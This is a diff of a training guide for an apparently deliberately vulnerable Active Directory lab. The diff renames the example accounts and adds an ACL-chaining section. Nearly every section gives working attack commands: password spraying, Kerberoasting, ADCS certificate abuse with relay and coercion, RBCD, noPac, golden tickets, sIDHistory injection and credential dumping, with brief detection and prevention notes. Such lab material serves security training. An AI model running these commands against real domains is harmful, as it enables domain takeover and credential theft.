@@ -31,12 +31,12 @@ STEP 1  ── Foothold #1: AS-REP roast ─────────────
 
 STEP 1' ── Alternative foothold: spray ─────────────────────
   kerbrute passwordspray -d corp.local --dc 10.10.0.10 users.txt 'Password123!'
-  → alice : Password123!
+  → peter.parker : Password123!
 ```
 
 ```
 STEP 2  ── Domain user ──────────────────────────────────
-  bloodhound-python -u alice -p '<pw>' -d corp.local -ns 10.10.0.10 -c all
+  bloodhound-python -u peter.parker -p '<pw>' -d corp.local -ns 10.10.0.10 -c all
   → full graph, paths to DA visible
 ```
 
@@ -53,10 +53,10 @@ Below is **Path B** — the fastest in DVAD:
 
 ```
 STEP 3.B  ── ADCS ESC1 chain ──────────────────────────────
-  certipy find -u alice -p '<pw>' -dc-ip 10.10.0.10 -vulnerable -stdout
+  certipy find -u peter.parker -p '<pw>' -dc-ip 10.10.0.10 -vulnerable -stdout
   → ESC1Template found
 
-  certipy req -u alice -p '<pw>' -ca corp-CA-CA \
+  certipy req -u peter.parker -p '<pw>' -ca corp-CA-CA \
      -template ESC1Template -upn Administrator@corp.local \
      -target ca01.corp.local
   → administrator.pfx
@@ -116,8 +116,8 @@ Done. ~45 minutes if everything goes smoothly; ~3-4 hours if you stop to learn w
 
 ```
 ┌──────────────┐     impacket-GetUserSPNs    ┌──────────────────────────┐
-│ Domain User  │ ─────────────────────────▶  │ TGS for svc_web (RC4)    │
-│ (alice)      │                              │ TGS encrypted w/ svc_web │
+│ Domain User  │ ─────────────────────────▶  │ TGS for svc_vision (RC4)    │
+│ (peter.parker)      │                              │ TGS encrypted w/ svc_vision │
 └──────────────┘                              │ NT hash                  │
                                               └────────────┬─────────────┘
                                                            │ hashcat -m 13100
@@ -127,9 +127,9 @@ Done. ~45 minutes if everything goes smoothly; ~3-4 hours if you stop to learn w
                                               └────────────┬─────────────┘
                                                            ▼
                        ┌──────────────────────────────────────────────┐
-                       │ svc_web is local admin somewhere?  → PtH/PtT │
-                       │ svc_web has constrained deleg?   → S4U2Proxy  │
-                       │ svc_web in Server Operators?     → SCM → SYSTEM│
+                       │ svc_vision is local admin somewhere?  → PtH/PtT │
+                       │ svc_vision has constrained deleg?   → S4U2Proxy  │
+                       │ svc_vision in Server Operators?     → SCM → SYSTEM│
                        └──────────────────────────────────────────────┘
 ```
 
@@ -139,15 +139,15 @@ Detect: 4769 RC4 + bulk; honeypot SPN. Prevent: AES-only; gMSAs; 25+ char random
 
 ```bash
 # 1. Enumerate SPN-bearing accounts and request TGSes (RC4)
-impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 -request -outputfile spns.kerberoast
+impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 -request -outputfile spns.kerberoast
 
 # 2. Crack offline
 hashcat -m 13100 spns.kerberoast /usr/share/wordlists/rockyou.txt --force
 
-# 3. Use the recovered password (svc_web)
-nxc smb 10.10.0.13 -u svc_web -p 'Summer2023!'                       # local admin?
-nxc ldap 10.10.0.10 -u svc_web -p 'Summer2023!' --kerberoasting all  # second-hop
-impacket-getST -spn cifs/dc01.corp.local -impersonate Administrator corp.local/svc_web:'Summer2023!'   # if constrained
+# 3. Use the recovered password (svc_vision)
+nxc smb 10.10.0.13 -u svc_vision -p 'Summer2023!'                       # local admin?
+nxc ldap 10.10.0.10 -u svc_vision -p 'Summer2023!' --kerberoasting all  # second-hop
+impacket-getST -spn cifs/dc01.corp.local -impersonate Administrator corp.local/svc_vision:'Summer2023!'   # if constrained
 ```
 
 ---
@@ -183,10 +183,10 @@ Detect: 4886/4887 with requester≠SAN. Prevent: drop `ENROLLEE_SUPPLIES_SUBJECT
 
 ```bash
 # 1. Find vulnerable templates
-certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -stdout -vulnerable
+certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -stdout -vulnerable
 
 # 2. Request a cert as Administrator using ESC1
-certipy req -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
+certipy req -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
             -ca 'CORP-CA' -template 'ESC1Template' -upn 'Administrator@corp.local'
 
 # 3. PKINIT → TGT + NT hash
@@ -239,8 +239,8 @@ sudo impacket-ntlmrelayx -t http://10.10.0.12/certsrv/certfnsh.asp \
                          --adcs --template DomainController -smb2support &
 
 # 2. Coerce DC01$ to authenticate to your attacker IP (10.10.0.1)
-impacket-PetitPotam -u alice -p 'DVADlab2024!' -d corp.local 10.10.0.1 10.10.0.10
-# (or: impacket-coercer -u alice -p 'DVADlab2024!' -d corp.local -t 10.10.0.10 -l 10.10.0.1)
+impacket-PetitPotam -u peter.parker -p 'DVADlab2024!' -d corp.local 10.10.0.1 10.10.0.10
+# (or: impacket-coercer -u peter.parker -p 'DVADlab2024!' -d corp.local -t 10.10.0.10 -l 10.10.0.1)
 
 # 3. Take the base64 cert ntlmrelayx prints; convert to PFX and use PKINIT
 echo '<b64>' | base64 -d > dc01.pfx
@@ -257,7 +257,7 @@ impacket-secretsdump -k -no-pass -just-dc-user krbtgt corp.local/dc01\$@dc01.cor
 ```
                          ┌──────────────────┐
                          │ Domain User      │
-                         │ alice (MAQ=10)   │
+                         │ peter.parker (MAQ=10)   │
                          └────────┬─────────┘
                                   │
                                   │ impacket-addcomputer
@@ -295,12 +295,12 @@ Detect: 4741 (computer created by non-admin), 5136 on `msDS-AllowedToActOnBehalf
 
 ```bash
 # 1. Create attacker-controlled machine account (MAQ=10 in DVAD)
-impacket-addcomputer corp.local/alice:'DVADlab2024!' -computer-name 'evil$' \
+impacket-addcomputer corp.local/peter.parker:'DVADlab2024!' -computer-name 'evil$' \
                      -computer-pass 'EvilPass1!' -dc-ip 10.10.0.10
 
 # 2. Write RBCD attribute on the target (e.g., ws01$)
 impacket-rbcd -delegate-from 'evil$' -delegate-to 'ws01$' -dc-ip 10.10.0.10 \
-              -action write corp.local/alice:'DVADlab2024!'
+              -action write corp.local/peter.parker:'DVADlab2024!'
 
 # 3. S4U2Self+S4U2Proxy as evil$ impersonating Administrator
 impacket-getST -spn cifs/ws01.corp.local -impersonate Administrator \
@@ -316,7 +316,7 @@ impacket-psexec -k -no-pass ws01.corp.local
 ## 6. Wireframe — Pattern E: noPac (CVE-2021-42278/42287)
 
 ```
-alice                                                    DC01
+peter.parker                                                    DC01
   │  addcomputer evil$  (MAQ=10)                          │
   │ ──────────────────────────────────────────────────▶   │
   │                                                       │ ok
@@ -345,15 +345,15 @@ Detect: 4741+4742+4624 mismatched name; MDI noPac. Prevent: patch KB5008380; MAQ
 
 ```bash
 # DVAD: corp.local has MAQ=10 and is unpatched against noPac.
-impacket-noPac.py corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
+impacket-noPac.py corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
                   -dc-host dc01.corp.local -shell --impersonate Administrator
 
 # Or via impacket-addcomputer + manual rename:
-impacket-addcomputer corp.local/alice:'DVADlab2024!' -computer-name 'evil$' \
+impacket-addcomputer corp.local/peter.parker:'DVADlab2024!' -computer-name 'evil$' \
                      -computer-pass 'EvilPass1!' -dc-ip 10.10.0.10
-impacket-renameMachine corp.local/alice:'DVADlab2024!' -current-name 'evil$' -new-name 'dc01' -dc-ip 10.10.0.10
+impacket-renameMachine corp.local/peter.parker:'DVADlab2024!' -current-name 'evil$' -new-name 'dc01' -dc-ip 10.10.0.10
 impacket-getTGT corp.local/dc01:'EvilPass1!' -dc-ip 10.10.0.10
-impacket-renameMachine corp.local/alice:'DVADlab2024!' -current-name 'dc01' -new-name 'evil$' -dc-ip 10.10.0.10
+impacket-renameMachine corp.local/peter.parker:'DVADlab2024!' -current-name 'dc01' -new-name 'evil$' -dc-ip 10.10.0.10
 KRB5CCNAME=dc01.ccache impacket-getST -self -impersonate Administrator -spn 'cifs/dc01.corp.local' -k -no-pass corp.local/dc01
 KRB5CCNAME=Administrator.ccache impacket-secretsdump -k -no-pass dc01.corp.local
 ```
@@ -438,7 +438,7 @@ impacket-secretsdump -just-dc-user krbtgt eu.corp.local/Administrator@10.10.0.11
 impacket-lookupsid eu.corp.local/Administrator@10.10.0.11 | grep -i 'krbtgt\|domain'
 
 # 2. Get parent (corp.local) domain SID
-impacket-lookupsid corp.local/alice:'DVADlab2024!'@10.10.0.10 | head -5
+impacket-lookupsid corp.local/peter.parker:'DVADlab2024!'@10.10.0.10 | head -5
 
 # 3. Forge Golden Ticket in CHILD with parent EA/DA SIDs appended via /sids
 impacket-ticketer -nthash <eu_krbtgt_nt> -domain-sid <EU_SID> -domain eu.corp.local \
@@ -592,7 +592,7 @@ scp ... l.dmp .
 pypykatz lsa minidump l.dmp
 
 # 4. Pivot via SOCKS5
-proxychains4 -q nxc smb 10.10.0.13 -u alice -H <NTLM>
+proxychains4 -q nxc smb 10.10.0.13 -u peter.parker -H <NTLM>
 ```
 
 ---
@@ -793,7 +793,38 @@ hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
 
 ---
 
-## 10f. Wireframe — Pattern P: ExtraSID (Child → Parent, finance.local variant)
+## 10g. Wireframe — Pattern O: ACL Chaining (BloodHound Paths)
+
+```
+┌────────────────┐   BloodHound highlights      ┌──────────────────────┐
+│ peter.parker   │ ─────── GenericAll ────────▶ │ tony.stark           │
+│ qa_user        │ ───────── AddSelf ─────────▶ │ Avengers Admins      │
+│ developer1     │ ──── ForceChangePassword ──▶ │ nick.fury            │
+│ nick.fury      │ ───────── WriteSPN ────────▶ │ svc_vision           │
+│ SHIELD Agents  │ ────── GenericWrite ───────▶ │ Avengers Admins      │
+│ nick.fury      │ ──────── WriteOwner ───────▶ │ Domain Admins        │
+│ steve.rogers   │ ─────── GenericAll ────────▶ │ AdminSDHolder        │
+│ loki           │ ─────── GenericAll ────────▶ │ FILE01$ & SQL01$     │
+└────────────────┘                              └──────────────────────┘
+```
+
+**Canonical Chain Example:**
+1. Compromise `developer1` (e.g. via password spray).
+2. Reset `nick.fury` password (`ForceChangePassword`).
+3. Login as `nick.fury`.
+4. Exploit `WriteSPN` over `svc_vision` for Targeted Kerberoasting.
+   *OR* Exploit `WriteOwner` over `Domain Admins` (take ownership, grant yourself full control, add to group).
+   
+*Alternative Path:*
+1. Compromise `qa_user`.
+2. Exploit `AddSelf` to add yourself to `Avengers Admins`.
+
+Detect: BloodHound/AzureHound queries, 4739 (Domain Policy Changed), 4728 (Member Added to Security-Enabled Global Group).
+Prevent: Tidy up misconfigured ACLs using BloodHound data; enforce tiering models; remove arbitrary `WriteOwner`/`GenericAll` rights from standard users.
+
+---
+
+## 10h. Wireframe — Pattern P: ExtraSID (Child → Parent, finance.local variant)
 
 DVAD has parent-child trust `corp.local` ↔ `eu.corp.local` and external trusts to
 `finance.local` and `root.corp`. Pattern G covered `eu` → `corp`. Pattern P is the
@@ -897,11 +928,11 @@ nxc ldap 10.20.0.10 -u svc_x -p '<pw>' --query \
 
 # 2. Use BloodHound's "Cross-Forest" path query to confirm reachability
 # 3. Write yourself into the source-side group that grants the foreign SID
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' \
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' \
   --add-computer 'evil$' --groups 'CrossForestGroup'
 
 # 4. Authenticate to finance.local — your token now carries the foreign SID
-impacket-psexec finance.local/alice:'DVADlab2024!'@10.20.0.10
+impacket-psexec finance.local/peter.parker:'DVADlab2024!'@10.20.0.10
 ```
 
 ---
@@ -916,12 +947,12 @@ using a TGT from `corp.local`.
 
 ```bash
 # Need a TGT in corp.local first (any user works)
-impacket-getTGT corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
-export KRB5CCNAME=alice.ccache
+impacket-getTGT corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
+export KRB5CCNAME=peter.parker.ccache
 
 # Request TGSes for cross-forest SPNs
 impacket-GetUserSPNs -k -no-pass -target-domain finance.local -dc-ip 10.20.0.10 \
-                     -request corp.local/alice -outputfile xforest.kerberoast
+                     -request corp.local/peter.parker -outputfile xforest.kerberoast
 
 hashcat -m 13100 xforest.kerberoast /usr/share/wordlists/rockyou.txt
 ```
@@ -964,15 +995,15 @@ including foreign EA SIDs.
 # 1. From DA@corp.local, use mimikatz to inject sIDHistory
 # (run on a Windows host that has reachability to the DC)
 mimikatz # privilege::debug
-mimikatz # sid::add /sid:S-1-5-21-FINANCE-519 /sam:alice
+mimikatz # sid::add /sid:S-1-5-21-FINANCE-519 /sam:peter.parker
 
 # OR via DCShadow primitive (impacket):
-impacket-secretsdump -just-dc-user alice corp.local/Administrator@10.10.0.10
+impacket-secretsdump -just-dc-user peter.parker corp.local/Administrator@10.10.0.10
 # then dcshadow.py to push the sIDHistory attribute
 
-# 2. alice now carries the foreign EA SID in PAC of every TGS
-impacket-getTGT corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
-impacket-secretsdump -k -no-pass -just-dc finance.local/alice@dc01.finance.local
+# 2. peter.parker now carries the foreign EA SID in PAC of every TGS
+impacket-getTGT corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
+impacket-secretsdump -k -no-pass -just-dc finance.local/peter.parker@dc01.finance.local
 ```
 
 ---
@@ -988,12 +1019,12 @@ unconstrained host and you get a usable foreign TGT.
 
 ```bash
 # 1. Confirm svc_legacy unconstrained
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --trusted-for-delegation
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --trusted-for-delegation
 
 # 2. Make a service run as svc_legacy on a host you own; or use file01 if you
 #    have local admin there (DVAD wires svc_legacy as the file01 service)
 #    Then coerce dc01.finance.local to authenticate:
-impacket-PetitPotam -u alice -p 'DVADlab2024!' -d corp.local \
+impacket-PetitPotam -u peter.parker -p 'DVADlab2024!' -d corp.local \
                     file01.corp.local 10.20.0.10
 
 # 3. Dump tickets from LSASS on file01 (Rubeus monitor / mimikatz sekurlsa::tickets)
